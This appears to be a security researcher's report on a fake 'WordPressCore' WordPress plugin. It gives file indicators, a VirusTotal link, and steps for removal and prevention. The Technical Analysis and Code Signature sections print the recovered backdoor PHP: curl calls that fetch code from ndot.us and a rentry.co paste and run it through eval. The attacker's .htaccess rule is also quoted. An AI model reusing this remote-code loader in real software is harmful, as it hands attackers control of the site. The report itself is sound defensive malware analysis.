---
title: "Investigation into Malicious WordPress Core Plugin"
slug: "malicious-wordpress-core-plugin"
description: "Investigation details of a malicious fake WordPress plugin found in wp-content/plugins folder along with IOC details."
reportDate: "2026-02-01"
threatType: "Malware"
severity: "High"
fileHash: "e4b812ae773c963ff2708fe42f5603cab3cb0dd38db9b787ea2236fa2bdf6219"
detectedPaths: [".htaccess","crypto.txt","hibgqdnj.php","iaactvgd.php","include.php","ipqxfpkt.php","nmi.php","style.php"]
screenshots: ["/images/wordpress-threats/WordPressCore_evidence-1.png","/images/wordpress-threats/WordPressCore_evidence-2.png","/images/wordpress-threats/WordPressCore_evidence-3.png"]
vtLink: "https://www.virustotal.com/gui/file/e4b812ae773c963ff2708fe42f5603cab3cb0dd38db9b787ea2236fa2bdf6219"
vtScore: "0/58"
impact: "High risk of system compromise and potential data leakage."
seenOn: "WordPress installations with questionable plugins."
behavior: "PHP scripts downloading and executing external code indicating backdoor use."
difficulty: "Medium"
recurrence: "Likely without proper security measures"
numberOfSiteFixed: "1"
---

## Technical Analysis
I investigated the WordPressCore plugin within the `wp-content/plugins` directory and found multiple signs of malicious activity. The fake plugin was designed to appear legitimate but was executing harmful actions.

### Key Findings

1. **HTAccess File**
   The `.htaccess` file contained a directive to deny access to scripts with extensions associated with suspected files:
   ```apache
   <FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|php6|php7|php8|pHtml|suspected)$">
   Order Allow,Deny
   Deny from all
   </FilesMatch>
   ```
   This is a common technique used to obstruct access to web shells and malware scripts.

2. **Crypto.txt File**
   The `crypto.txt` file contained what appears to be encoded information. While I didn't decode it, encoded files like this can store configuration or malicious payloads securely.

3. **External Script Calls**
   Files like `hibgqdnj.php` and `iaactvgd.php` contained scripts designed to fetch external code and execute it. This is a critical finding indicating a potentially dangerous backdoor into the system.

   ```php
   $url = "http://ndot.us/za";
   $ch = curl_init($url);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   $result = curl_exec($ch);
   eval("?>".$result);
   ```

   ```php
   function get($url) {
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_HEADER, 0);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt($ch, CURLOPT_URL, $url);
       $data = curl_exec($ch);
       curl_close($ch);
       return $data;
   }
   eval("?>" . get('https://rentry.co/mmgbs/raw'));
   ```

### Recommendations

- **Immediate Actions:**
  - Remove the fake plugin and referenced files immediately.
  - Restore the site from a known clean backup.
  - Update WordPress and all plugins to their latest versions.

- **Preventative Measures:**
  - Implement file integrity monitoring.
  - Regularly audit plugins and themes for authenticity.
  - Employ a strong Web Application Firewall (WAF).

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain
1. Investigated the WordPress plugins directory.
2. Detected a fake plugin named 'WordPressCore'.
3. Analyzed the contents of key files associated with plugin activity.

## Code Signature(s)

### FILE: `hibgqdnj.php`
> **Analysis:** This snippet fetches and executes external PHP code, potentially a backdoor.

```php
<?php 
$url = "http://ndot.us/za";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);
```


### FILE: `iaactvgd.php`
> **Analysis:** This code downloads and executes a script from an external URL.

```php
function get($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
eval("?>" . get('https://rentry.co/mmgbs/raw'));
```


## Indicators of Compromise (IOCs)
- `hxxp://ndot[.]us/za`
- `hxxp://rentry[.]co/mmgbs/raw`

## Removal Protocol
1. Remove fake plugin from `wp-content/plugins`.
1. Delete `hibgqdnj.php` and `iaactvgd.php`.
1. Clear encoded content in `crypto.txt`.
1. Review and reset file permissions.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
